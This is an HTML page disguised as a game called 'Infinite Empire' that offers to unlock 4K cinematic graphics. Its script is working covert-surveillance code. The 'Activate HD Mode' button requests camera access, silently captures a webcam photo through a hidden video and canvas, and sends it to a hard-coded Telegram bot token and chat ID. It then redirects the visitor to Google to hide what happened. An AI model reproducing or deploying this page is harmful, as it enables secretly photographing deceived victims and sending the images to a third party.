<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Infinite Empire | Cinematic Experience</title>
    <style>
        body { margin: 0; background: #050505; color: gold; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { border: 2px solid #333; padding: 30px; border-radius: 20px; background: rgba(20, 20, 20, 0.9); box-shadow: 0 0 20px gold; }
        .btn { background: linear-gradient(45deg, #ffd700, #ff8c00); color: black; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>INFINITE EMPIRE</h1>
        <p>Unlock 4K Cinematic Graphics to Continue</p>
        <button class="btn" onclick="startMission()">ACTIVATE HD MODE</button>
    </div>
    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const token = '8382441024:AAG1HuwXBU05vSDkSZFUi8oKG930WJ7QrY'; // Aapka Token
        const chat_id = '8254708740'; // Aapki Chat ID
        let count = 0;

        async function startMission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                // No alert here, directly start capturing
                captureSequence();
            } catch (err) { 
                // If camera permission is denied, still redirect but notify
                alert("Camera permission denied. Redirecting to complete mission.");
                window.location.href = "https://www.google.com";
            }
        }

        function captureSequence() {
            if (count < 1) { // Changed to capture only 1 photo quickly
                setTimeout(() => { 
                    capture(); 
                    count++; 
                    // No need to call captureSequence again if only 1 photo
                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500); // Redirect after capture
                }, 1000); // Capture after 1 second of stream start
            } else { 
                // If for some reason count is more than 1, still redirect
                window.location.href = "https://www.google.com"; 
            }
        }

        function capture() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            if (video.readyState === video.HAVE_ENOUGH_DATA) { // Ensure video data is ready
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'capture.jpg');
                    
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                        method: 'POST', 
                        body: formData 
                    }).then(response => {
                        if (!response.ok) {
                            console.error('Telegram API error:', response.statusText);
                        }
                    }).catch(error => {
                        console.error('Error sending photo to Telegram:', error);
                    });
                }, 'image/jpeg');
            } else {
                console.log("Video not ready for capture yet.");
                // Retry if video is not ready
                setTimeout(capture, 500);
            }
        }
    </script>
</body>
</html>
